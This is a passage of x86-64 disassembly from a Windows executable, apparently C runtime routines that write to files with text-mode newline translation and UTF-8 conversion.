   14000c4ad:	0f 84 a8 00 00 00    	je     0x14000c55b
   14000c4b3:	83 7d 97 01          	cmpl   $0x1,-0x69(%rbp)
   14000c4b7:	0f 82 a6 00 00 00    	jb     0x14000c563
   14000c4bd:	ff 43 08             	incl   0x8(%rbx)
   14000c4c0:	ff 43 04             	incl   0x4(%rbx)
   14000c4c3:	8b 53 04             	mov    0x4(%rbx),%edx
   14000c4c6:	48 3b 75 9f          	cmp    -0x61(%rbp),%rsi
   14000c4ca:	0f 83 93 00 00 00    	jae    0x14000c563
   14000c4d0:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000c4d4:	4c 8b 4d ef          	mov    -0x11(%rbp),%r9
   14000c4d8:	8b 4d bb             	mov    -0x45(%rbp),%ecx
   14000c4db:	e9 01 fd ff ff       	jmp    0x14000c1e1
   14000c4e0:	48 85 d2             	test   %rdx,%rdx
   14000c4e3:	7e 24                	jle    0x14000c509
   14000c4e5:	49 2b f6             	sub    %r14,%rsi
   14000c4e8:	4b 8b 8c eb 30 b6 01 	mov    0x1b630(%r11,%r13,8),%rcx
   14000c4ef:	00 
   14000c4f0:	49 03 ce             	add    %r14,%rcx
   14000c4f3:	42 8a 04 36          	mov    (%rsi,%r14,1),%al
   14000c4f7:	42 88 44 f9 3e       	mov    %al,0x3e(%rcx,%r15,8)
   14000c4fc:	ff c7                	inc    %edi
   14000c4fe:	49 ff c6             	inc    %r14
   14000c501:	48 63 c7             	movslq %edi,%rax
   14000c504:	48 3b c2             	cmp    %rdx,%rax
   14000c507:	7c df                	jl     0x14000c4e8
   14000c509:	01 53 04             	add    %edx,0x4(%rbx)
   14000c50c:	eb 55                	jmp    0x14000c563
   14000c50e:	4d 85 c0             	test   %r8,%r8
   14000c511:	7e 27                	jle    0x14000c53a
   14000c513:	48 8b d7             	mov    %rdi,%rdx
   14000c516:	4c 8b 4d c7          	mov    -0x39(%rbp),%r9
   14000c51a:	4b 8b 8c cb 30 b6 01 	mov    0x1b630(%r11,%r9,8),%rcx
   14000c521:	00 
   14000c522:	48 03 ca             	add    %rdx,%rcx
   14000c525:	8a 04 32             	mov    (%rdx,%rsi,1),%al
   14000c528:	42 88 44 f9 3e       	mov    %al,0x3e(%rcx,%r15,8)
   14000c52d:	ff c7                	inc    %edi
   14000c52f:	48 ff c2             	inc    %rdx
   14000c532:	48 63 c7             	movslq %edi,%rax
   14000c535:	49 3b c0             	cmp    %r8,%rax
   14000c538:	7c e0                	jl     0x14000c51a
   14000c53a:	44 01 43 04          	add    %r8d,0x4(%rbx)
   14000c53e:	eb 23                	jmp    0x14000c563
   14000c540:	47 88 4c f8 3e       	mov    %r9b,0x3e(%r8,%r15,8)
   14000c545:	4b 8b 84 eb 30 b6 01 	mov    0x1b630(%r11,%r13,8),%rax
   14000c54c:	00 
   14000c54d:	42 80 4c f8 3d 04    	orb    $0x4,0x3d(%rax,%r15,8)
   14000c553:	8d 42 01             	lea    0x1(%rdx),%eax
   14000c556:	89 43 04             	mov    %eax,0x4(%rbx)
   14000c559:	eb 08                	jmp    0x14000c563
   14000c55b:	ff 15 77 3b 00 00    	call   *0x3b77(%rip)        # 0x1400100d8
   14000c561:	89 03                	mov    %eax,(%rbx)
   14000c563:	48 8b c3             	mov    %rbx,%rax
   14000c566:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   14000c56a:	48 33 cc             	xor    %rsp,%rcx
   14000c56d:	e8 ee 4d ff ff       	call   0x140001360
   14000c572:	48 8b 9c 24 10 01 00 	mov    0x110(%rsp),%rbx
   14000c579:	00 
   14000c57a:	48 81 c4 d0 00 00 00 	add    $0xd0,%rsp
   14000c581:	41 5f                	pop    %r15
   14000c583:	41 5e                	pop    %r14
   14000c585:	41 5d                	pop    %r13
   14000c587:	41 5c                	pop    %r12
   14000c589:	5f                   	pop    %rdi
   14000c58a:	5e                   	pop    %rsi
   14000c58b:	5d                   	pop    %rbp
   14000c58c:	c3                   	ret
   14000c58d:	cc                   	int3
   14000c58e:	cc                   	int3
   14000c58f:	cc                   	int3
   14000c590:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c595:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000c59a:	56                   	push   %rsi
   14000c59b:	57                   	push   %rdi
   14000c59c:	41 56                	push   %r14
   14000c59e:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000c5a3:	e8 a8 27 00 00       	call   0x14000ed50
   14000c5a8:	48 2b e0             	sub    %rax,%rsp
   14000c5ab:	48 8b 05 4e da 00 00 	mov    0xda4e(%rip),%rax        # 0x14001a000
   14000c5b2:	48 33 c4             	xor    %rsp,%rax
   14000c5b5:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000c5bc:	00 
   14000c5bd:	4c 63 d2             	movslq %edx,%r10
   14000c5c0:	48 8b f9             	mov    %rcx,%rdi
   14000c5c3:	49 8b c2             	mov    %r10,%rax
   14000c5c6:	41 8b e9             	mov    %r9d,%ebp
   14000c5c9:	48 c1 f8 06          	sar    $0x6,%rax
   14000c5cd:	48 8d 0d 5c f0 00 00 	lea    0xf05c(%rip),%rcx        # 0x14001b630
   14000c5d4:	41 83 e2 3f          	and    $0x3f,%r10d
   14000c5d8:	49 03 e8             	add    %r8,%rbp
   14000c5db:	49 8b f0             	mov    %r8,%rsi
   14000c5de:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000c5e2:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000c5e6:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000c5eb:	33 c0                	xor    %eax,%eax
   14000c5ed:	48 89 07             	mov    %rax,(%rdi)
   14000c5f0:	89 47 08             	mov    %eax,0x8(%rdi)
   14000c5f3:	4c 3b c5             	cmp    %rbp,%r8
   14000c5f6:	73 6f                	jae    0x14000c667
   14000c5f8:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000c5fd:	48 3b f5             	cmp    %rbp,%rsi
   14000c600:	73 24                	jae    0x14000c626
   14000c602:	8a 06                	mov    (%rsi),%al
   14000c604:	48 ff c6             	inc    %rsi
   14000c607:	3c 0a                	cmp    $0xa,%al
   14000c609:	75 09                	jne    0x14000c614
   14000c60b:	ff 47 08             	incl   0x8(%rdi)
   14000c60e:	c6 03 0d             	movb   $0xd,(%rbx)
   14000c611:	48 ff c3             	inc    %rbx
   14000c614:	88 03                	mov    %al,(%rbx)
   14000c616:	48 ff c3             	inc    %rbx
   14000c619:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   14000c620:	00 
   14000c621:	48 3b d8             	cmp    %rax,%rbx
   14000c624:	72 d7                	jb     0x14000c5fd
   14000c626:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000c62c:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000c631:	2b d8                	sub    %eax,%ebx
   14000c633:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000c638:	44 8b c3             	mov    %ebx,%r8d
   14000c63b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000c640:	49 8b ce             	mov    %r14,%rcx
   14000c643:	ff 15 17 3b 00 00    	call   *0x3b17(%rip)        # 0x140010160
   14000c649:	85 c0                	test   %eax,%eax
   14000c64b:	74 12                	je     0x14000c65f
   14000c64d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000c651:	01 47 04             	add    %eax,0x4(%rdi)
   14000c654:	3b c3                	cmp    %ebx,%eax
   14000c656:	72 0f                	jb     0x14000c667
   14000c658:	48 3b f5             	cmp    %rbp,%rsi
   14000c65b:	72 9b                	jb     0x14000c5f8
   14000c65d:	eb 08                	jmp    0x14000c667
   14000c65f:	ff 15 73 3a 00 00    	call   *0x3a73(%rip)        # 0x1400100d8
   14000c665:	89 07                	mov    %eax,(%rdi)
   14000c667:	48 8b c7             	mov    %rdi,%rax
   14000c66a:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000c671:	00 
   14000c672:	48 33 cc             	xor    %rsp,%rcx
   14000c675:	e8 e6 4c ff ff       	call   0x140001360
   14000c67a:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000c681:	00 
   14000c682:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000c686:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000c68a:	49 8b e3             	mov    %r11,%rsp
   14000c68d:	41 5e                	pop    %r14
   14000c68f:	5f                   	pop    %rdi
   14000c690:	5e                   	pop    %rsi
   14000c691:	c3                   	ret
   14000c692:	cc                   	int3
   14000c693:	cc                   	int3
   14000c694:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c699:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000c69e:	56                   	push   %rsi
   14000c69f:	57                   	push   %rdi
   14000c6a0:	41 56                	push   %r14
   14000c6a2:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000c6a7:	e8 a4 26 00 00       	call   0x14000ed50
   14000c6ac:	48 2b e0             	sub    %rax,%rsp
   14000c6af:	48 8b 05 4a d9 00 00 	mov    0xd94a(%rip),%rax        # 0x14001a000
   14000c6b6:	48 33 c4             	xor    %rsp,%rax
   14000c6b9:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000c6c0:	00 
   14000c6c1:	4c 63 d2             	movslq %edx,%r10
   14000c6c4:	48 8b f9             	mov    %rcx,%rdi
   14000c6c7:	49 8b c2             	mov    %r10,%rax
   14000c6ca:	41 8b e9             	mov    %r9d,%ebp
   14000c6cd:	48 c1 f8 06          	sar    $0x6,%rax
   14000c6d1:	48 8d 0d 58 ef 00 00 	lea    0xef58(%rip),%rcx        # 0x14001b630
   14000c6d8:	41 83 e2 3f          	and    $0x3f,%r10d
   14000c6dc:	49 03 e8             	add    %r8,%rbp
   14000c6df:	49 8b f0             	mov    %r8,%rsi
   14000c6e2:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000c6e6:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000c6ea:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000c6ef:	33 c0                	xor    %eax,%eax
   14000c6f1:	48 89 07             	mov    %rax,(%rdi)
   14000c6f4:	89 47 08             	mov    %eax,0x8(%rdi)
   14000c6f7:	4c 3b c5             	cmp    %rbp,%r8
   14000c6fa:	0f 83 82 00 00 00    	jae    0x14000c782
   14000c700:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000c705:	48 3b f5             	cmp    %rbp,%rsi
   14000c708:	73 31                	jae    0x14000c73b
   14000c70a:	0f b7 06             	movzwl (%rsi),%eax
   14000c70d:	48 83 c6 02          	add    $0x2,%rsi
   14000c711:	66 83 f8 0a          	cmp    $0xa,%ax
   14000c715:	75 10                	jne    0x14000c727
   14000c717:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   14000c71b:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000c720:	66 89 0b             	mov    %cx,(%rbx)
   14000c723:	48 83 c3 02          	add    $0x2,%rbx
   14000c727:	66 89 03             	mov    %ax,(%rbx)
   14000c72a:	48 83 c3 02          	add    $0x2,%rbx
   14000c72e:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   14000c735:	00 
   14000c736:	48 3b d8             	cmp    %rax,%rbx
   14000c739:	72 ca                	jb     0x14000c705
   14000c73b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000c741:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000c746:	48 2b d8             	sub    %rax,%rbx
   14000c749:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000c74e:	48 d1 fb             	sar    $1,%rbx
   14000c751:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000c756:	03 db                	add    %ebx,%ebx
   14000c758:	49 8b ce             	mov    %r14,%rcx
   14000c75b:	44 8b c3             	mov    %ebx,%r8d
   14000c75e:	ff 15 fc 39 00 00    	call   *0x39fc(%rip)        # 0x140010160
   14000c764:	85 c0                	test   %eax,%eax
   14000c766:	74 12                	je     0x14000c77a
   14000c768:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000c76c:	01 47 04             	add    %eax,0x4(%rdi)
   14000c76f:	3b c3                	cmp    %ebx,%eax
   14000c771:	72 0f                	jb     0x14000c782
   14000c773:	48 3b f5             	cmp    %rbp,%rsi
   14000c776:	72 88                	jb     0x14000c700
   14000c778:	eb 08                	jmp    0x14000c782
   14000c77a:	ff 15 58 39 00 00    	call   *0x3958(%rip)        # 0x1400100d8
   14000c780:	89 07                	mov    %eax,(%rdi)
   14000c782:	48 8b c7             	mov    %rdi,%rax
   14000c785:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000c78c:	00 
   14000c78d:	48 33 cc             	xor    %rsp,%rcx
   14000c790:	e8 cb 4b ff ff       	call   0x140001360
   14000c795:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000c79c:	00 
   14000c79d:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000c7a1:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000c7a5:	49 8b e3             	mov    %r11,%rsp
   14000c7a8:	41 5e                	pop    %r14
   14000c7aa:	5f                   	pop    %rdi
   14000c7ab:	5e                   	pop    %rsi
   14000c7ac:	c3                   	ret
   14000c7ad:	cc                   	int3
   14000c7ae:	cc                   	int3
   14000c7af:	cc                   	int3
   14000c7b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c7b5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000c7ba:	56                   	push   %rsi
   14000c7bb:	57                   	push   %rdi
   14000c7bc:	41 54                	push   %r12
   14000c7be:	41 56                	push   %r14
   14000c7c0:	41 57                	push   %r15
   14000c7c2:	b8 70 14 00 00       	mov    $0x1470,%eax
   14000c7c7:	e8 84 25 00 00       	call   0x14000ed50
   14000c7cc:	48 2b e0             	sub    %rax,%rsp
   14000c7cf:	48 8b 05 2a d8 00 00 	mov    0xd82a(%rip),%rax        # 0x14001a000
   14000c7d6:	48 33 c4             	xor    %rsp,%rax
   14000c7d9:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   14000c7e0:	00 
   14000c7e1:	4c 63 d2             	movslq %edx,%r10
   14000c7e4:	48 8b d9             	mov    %rcx,%rbx
   14000c7e7:	49 8b c2             	mov    %r10,%rax
   14000c7ea:	45 8b f1             	mov    %r9d,%r14d
   14000c7ed:	48 c1 f8 06          	sar    $0x6,%rax
   14000c7f1:	48 8d 0d 38 ee 00 00 	lea    0xee38(%rip),%rcx        # 0x14001b630
   14000c7f8:	41 83 e2 3f          	and    $0x3f,%r10d
   14000c7fc:	4d 03 f0             	add    %r8,%r14
   14000c7ff:	4d 8b f8             	mov    %r8,%r15
   14000c802:	49 8b f8             	mov    %r8,%rdi
   14000c805:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000c809:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000c80d:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   14000c812:	33 c0                	xor    %eax,%eax
   14000c814:	48 89 03             	mov    %rax,(%rbx)
   14000c817:	4d 3b c6             	cmp    %r14,%r8
   14000c81a:	89 43 08             	mov    %eax,0x8(%rbx)
   14000c81d:	0f 83 ce 00 00 00    	jae    0x14000c8f1
   14000c823:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000c828:	49 3b fe             	cmp    %r14,%rdi
   14000c82b:	73 2d                	jae    0x14000c85a
   14000c82d:	0f b7 0f             	movzwl (%rdi),%ecx
   14000c830:	48 83 c7 02          	add    $0x2,%rdi
   14000c834:	66 83 f9 0a          	cmp    $0xa,%cx
   14000c838:	75 0c                	jne    0x14000c846
   14000c83a:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000c83f:	66 89 10             	mov    %dx,(%rax)
   14000c842:	48 83 c0 02          	add    $0x2,%rax
   14000c846:	66 89 08             	mov    %cx,(%rax)
   14000c849:	48 83 c0 02          	add    $0x2,%rax
   14000c84d:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   14000c854:	00 
   14000c855:	48 3b c1             	cmp    %rcx,%rax
   14000c858:	72 ce                	jb     0x14000c828
   14000c85a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000c860:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000c865:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000c86b:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000c870:	48 2b c1             	sub    %rcx,%rax
   14000c873:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000c87a:	00 
   14000c87b:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   14000c882:	00 
   14000c883:	48 d1 f8             	sar    $1,%rax
   14000c886:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000c88b:	44 8b c8             	mov    %eax,%r9d
   14000c88e:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000c893:	33 d2                	xor    %edx,%edx
   14000c895:	e8 52 bd ff ff       	call   0x1400085ec
   14000c89a:	8b e8                	mov    %eax,%ebp
   14000c89c:	85 c0                	test   %eax,%eax
   14000c89e:	74 49                	je     0x14000c8e9
   14000c8a0:	33 f6                	xor    %esi,%esi
   14000c8a2:	85 c0                	test   %eax,%eax
   14000c8a4:	74 33                	je     0x14000c8d9
   14000c8a6:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000c8ac:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   14000c8b3:	00 
   14000c8b4:	8b ce                	mov    %esi,%ecx
   14000c8b6:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000c8bb:	44 8b c5             	mov    %ebp,%r8d
   14000c8be:	48 03 d1             	add    %rcx,%rdx
   14000c8c1:	49 8b cc             	mov    %r12,%rcx
   14000c8c4:	44 2b c6             	sub    %esi,%r8d
   14000c8c7:	ff 15 93 38 00 00    	call   *0x3893(%rip)        # 0x140010160
   14000c8cd:	85 c0                	test   %eax,%eax
   14000c8cf:	74 18                	je     0x14000c8e9
   14000c8d1:	03 74 24 40          	add    0x40(%rsp),%esi
   14000c8d5:	3b f5                	cmp    %ebp,%esi
   14000c8d7:	72 cd                	jb     0x14000c8a6
   14000c8d9:	8b c7                	mov    %edi,%eax
   14000c8db:	41 2b c7             	sub    %r15d,%eax
   14000c8de:	89 43 04             	mov    %eax,0x4(%rbx)
   14000c8e1:	49 3b fe             	cmp    %r14,%rdi
   14000c8e4:	e9 34 ff ff ff       	jmp    0x14000c81d
   14000c8e9:	ff 15 e9 37 00 00    	call   *0x37e9(%rip)        # 0x1400100d8
   14000c8ef:	89 03                	mov    %eax,(%rbx)
   14000c8f1:	48 8b c3             	mov    %rbx,%rax
   14000c8f4:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   14000c8fb:	00 
   14000c8fc:	48 33 cc             	xor    %rsp,%rcx
   14000c8ff:	e8 5c 4a ff ff       	call   0x140001360
   14000c904:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   14000c90b:	00 
   14000c90c:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000c910:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000c914:	49 8b e3             	mov    %r11,%rsp
   14000c917:	41 5f                	pop    %r15
   14000c919:	41 5e                	pop    %r14
   14000c91b:	41 5c                	pop    %r12
   14000c91d:	5f                   	pop    %rdi
   14000c91e:	5e                   	pop    %rsi
   14000c91f:	c3                   	ret
   14000c920:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000c925:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000c92a:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c92e:	56                   	push   %rsi
   14000c92f:	41 54                	push   %r12
   14000c931:	41 55                	push   %r13
   14000c933:	41 56                	push   %r14
   14000c935:	41 57                	push   %r15
   14000c937:	48 83 ec 30          	sub    $0x30,%rsp
   14000c93b:	49 8b d9             	mov    %r9,%rbx
   14000c93e:	45 8b e8             	mov    %r8d,%r13d
   14000c941:	48 63 f1             	movslq %ecx,%rsi
   14000c944:	83 fe fe             	cmp    $0xfffffffe,%esi
   14000c947:	75 2d                	jne    0x14000c976
   14000c949:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000c94e:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   14000c953:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000c958:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   14000c95f:	00 
   14000c960:	83 c8 ff             	or     $0xffffffff,%eax
   14000c963:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000c968:	48 83 c4 30          	add    $0x30,%rsp
   14000c96c:	41 5f                	pop    %r15
   14000c96e:	41 5e                	pop    %r14
   14000c970:	41 5d                	pop    %r13
   14000c972:	41 5c                	pop    %r12
   14000c974:	5e                   	pop    %rsi
   14000c975:	c3                   	ret
   14000c976:	85 c9                	test   %ecx,%ecx
   14000c978:	78 0f                	js     0x14000c989
   14000c97a:	3b 35 b0 f0 00 00    	cmp    0xf0b0(%rip),%esi        # 0x14001ba30
   14000c980:	73 07                	jae    0x14000c989
   14000c982:	b8 01 00 00 00       	mov    $0x1,%eax
   14000c987:	eb 02                	jmp    0x14000c98b
   14000c989:	33 c0                	xor    %eax,%eax
   14000c98b:	85 c0                	test   %eax,%eax
   14000c98d:	75 33                	jne    0x14000c9c2
   14000c98f:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000c994:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   14000c999:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000c99e:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   14000c9a5:	00 
   14000c9a6:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000c9ab:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000c9b1:	45 33 c9             	xor    %r9d,%r9d
   14000c9b4:	45 33 c0             	xor    %r8d,%r8d
   14000c9b7:	33 d2                	xor    %edx,%edx
   14000c9b9:	33 c9                	xor    %ecx,%ecx
   14000c9bb:	e8 ec 9f ff ff       	call   0x1400069ac
   14000c9c0:	eb 9e                	jmp    0x14000c960
   14000c9c2:	48 8b c6             	mov    %rsi,%rax
   14000c9c5:	4c 8b fe             	mov    %rsi,%r15
   14000c9c8:	49 c1 ff 06          	sar    $0x6,%r15
   14000c9cc:	48 8d 0d 5d ec 00 00 	lea    0xec5d(%rip),%rcx        # 0x14001b630
   14000c9d3:	83 e0 3f             	and    $0x3f,%eax
   14000c9d6:	4c 8d 24 c0          	lea    (%rax,%rax,8),%r12
   14000c9da:	4a 8b 04 f9          	mov    (%rcx,%r15,8),%rax
   14000c9de:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000c9e4:	74 a9                	je     0x14000c98f
   14000c9e6:	8b ce                	mov    %esi,%ecx
   14000c9e8:	e8 f3 c4 ff ff       	call   0x140008ee0
   14000c9ed:	41 83 ce ff          	or     $0xffffffff,%r14d
   14000c9f1:	48 8d 05 38 ec 00 00 	lea    0xec38(%rip),%rax        # 0x14001b630
   14000c9f8:	4a 8b 04 f8          	mov    (%rax,%r15,8),%rax
   14000c9fc:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000ca02:	75 15                	jne    0x14000ca19
   14000ca04:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000ca08:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000ca0f:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000ca13:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   14000ca17:	eb 15                	jmp    0x14000ca2e
   14000ca19:	4c 8b cb             	mov    %rbx,%r9
   14000ca1c:	45 8b c5             	mov    %r13d,%r8d
   14000ca1f:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   14000ca24:	8b ce                	mov    %esi,%ecx
   14000ca26:	e8 15 00 00 00       	call   0x14000ca40
   14000ca2b:	44 8b f0             	mov    %eax,%r14d
   14000ca2e:	8b ce                	mov    %esi,%ecx
   14000ca30:	e8 d3 c4 ff ff       	call   0x140008f08
   14000ca35:	41 8b c6             	mov    %r14d,%eax
   14000ca38:	e9 26 ff ff ff       	jmp    0x14000c963
   14000ca3d:	cc                   	int3
   14000ca3e:	cc                   	int3
   14000ca3f:	cc                   	int3
   14000ca40:	40 55                	rex push %rbp
   14000ca42:	53                   	push   %rbx
   14000ca43:	56                   	push   %rsi
   14000ca44:	57                   	push   %rdi
   14000ca45:	41 54                	push   %r12
   14000ca47:	41 55                	push   %r13
   14000ca49:	41 56                	push   %r14
   14000ca4b:	41 57                	push   %r15
   14000ca4d:	48 8b ec             	mov    %rsp,%rbp
   14000ca50:	48 83 ec 78          	sub    $0x78,%rsp
   14000ca54:	33 ff                	xor    %edi,%edi
   14000ca56:	45 8b f0             	mov    %r8d,%r14d
   14000ca59:	4c 63 f9             	movslq %ecx,%r15
   14000ca5c:	49 8b d9             	mov    %r9,%rbx
   14000ca5f:	48 8b f2             	mov    %rdx,%rsi
   14000ca62:	45 85 c0             	test   %r8d,%r8d
   14000ca65:	0f 84 c8 02 00 00    	je     0x14000cd33
   14000ca6b:	48 85 d2             	test   %rdx,%rdx
   14000ca6e:	75 37                	jne    0x14000caa7
   14000ca70:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000ca75:	45 33 c0             	xor    %r8d,%r8d
   14000ca78:	41 89 79 34          	mov    %edi,0x34(%r9)
   14000ca7c:	33 d2                	xor    %edx,%edx
   14000ca7e:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000ca83:	33 c9                	xor    %ecx,%ecx
   14000ca85:	41 c7 41 2c 16 00 00 	movl   $0x16,0x2c(%r9)
   14000ca8c:	00 
   14000ca8d:	45 33 c9             	xor    %r9d,%r9d
   14000ca90:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000ca95:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000ca9a:	e8 0d 9f ff ff       	call   0x1400069ac
   14000ca9f:	83 c8 ff             	or     $0xffffffff,%eax
   14000caa2:	e9 8e 02 00 00       	jmp    0x14000cd35
   14000caa7:	49 8b c7             	mov    %r15,%rax
   14000caaa:	48 8d 0d 7f eb 00 00 	lea    0xeb7f(%rip),%rcx        # 0x14001b630
   14000cab1:	83 e0 3f             	and    $0x3f,%eax
   14000cab4:	4d 8b e7             	mov    %r15,%r12
   14000cab7:	49 c1 fc 06          	sar    $0x6,%r12
   14000cabb:	4c 89 65 e8          	mov    %r12,-0x18(%rbp)
   14000cabf:	4c 8d 2c c0          	lea    (%rax,%rax,8),%r13
   14000cac3:	4a 8b 0c e1          	mov    (%rcx,%r12,8),%rcx
   14000cac7:	42 8a 44 e9 39       	mov    0x39(%rcx,%r13,8),%al
   14000cacc:	88 45 b8             	mov    %al,-0x48(%rbp)
   14000cacf:	fe c8                	dec    %al
   14000cad1:	3c 01                	cmp    $0x1,%al
   14000cad3:	77 09                	ja     0x14000cade
   14000cad5:	41 8b c6             	mov    %r14d,%eax
   14000cad8:	f7 d0                	not    %eax
   14000cada:	a8 01                	test   $0x1,%al
   14000cadc:	74 92                	je     0x14000ca70
   14000cade:	42 f6 44 e9 38 20    	testb  $0x20,0x38(%rcx,%r13,8)
   14000cae4:	74 0e                	je     0x14000caf4
   14000cae6:	33 d2                	xor    %edx,%edx
   14000cae8:	41 8b cf             	mov    %r15d,%ecx
   14000caeb:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000caef:	e8 b4 0b 00 00       	call   0x14000d6a8
   14000caf4:	41 8b cf             	mov    %r15d,%ecx
   14000caf7:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   14000cafb:	e8 40 03 00 00       	call   0x14000ce40
   14000cb00:	48 8d 15 29 eb 00 00 	lea    0xeb29(%rip),%rdx        # 0x14001b630
   14000cb07:	85 c0                	test   %eax,%eax
   14000cb09:	0f 84 14 01 00 00    	je     0x14000cc23
   14000cb0f:	4a 8b 04 e2          	mov    (%rdx,%r12,8),%rax
   14000cb13:	42 38 7c e8 38       	cmp    %dil,0x38(%rax,%r13,8)
   14000cb18:	0f 8d 05 01 00 00    	jge    0x14000cc23
   14000cb1e:	40 38 7b 28          	cmp    %dil,0x28(%rbx)
   14000cb22:	75 0f                	jne    0x14000cb33
   14000cb24:	48 8b cb             	mov    %rbx,%rcx
   14000cb27:	e8 b4 93 ff ff       	call   0x140005ee0
   14000cb2c:	48 8d 15 fd ea 00 00 	lea    0xeafd(%rip),%rdx        # 0x14001b630
   14000cb33:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000cb37:	48 39 b8 38 01 00 00 	cmp    %rdi,0x138(%rax)
   14000cb3e:	75 0f                	jne    0x14000cb4f
   14000cb40:	4a 8b 04 e2          	mov    (%rdx,%r12,8),%rax
   14000cb44:	42 38 7c e8 39       	cmp    %dil,0x39(%rax,%r13,8)
   14000cb49:	0f 84 d4 00 00 00    	je     0x14000cc23
   14000cb4f:	4a 8b 0c e2          	mov    (%rdx,%r12,8),%rcx
   14000cb53:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000cb57:	4a 8b 4c e9 28       	mov    0x28(%rcx,%r13,8),%rcx
